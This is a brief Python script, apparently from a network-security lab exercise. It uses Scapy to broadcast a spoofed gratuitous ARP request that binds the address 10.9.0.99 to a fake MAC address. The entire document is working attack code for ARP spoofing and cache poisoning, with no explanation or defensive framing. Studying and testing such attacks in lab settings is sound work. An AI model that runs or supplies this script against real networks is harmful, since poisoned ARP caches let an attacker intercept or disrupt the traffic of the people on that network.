#!/usr/bin/python3
from scapy.all import *

IP_SPOOFED = '10.9.0.99'
MAC_SPOOFED = 'aa:bb:cc:dd:ee:ff'

print("SENDING SPOOFED ARP GRATUITOUS MESSAGE....")

ether = Ether()
ether.dst = 'ff:ff:ff:ff:ff:ff'
ether.src = MAC_SPOOFED

arp = ARP()
arp.psrc = IP_SPOOFED
arp.hwsrc = MAC_SPOOFED
arp.pdst = IP_SPOOFED
arp.hwdst = 'ff:ff:ff:ff:ff:ff'
arp.op = 1
frame = ether/arp
sendp(frame)

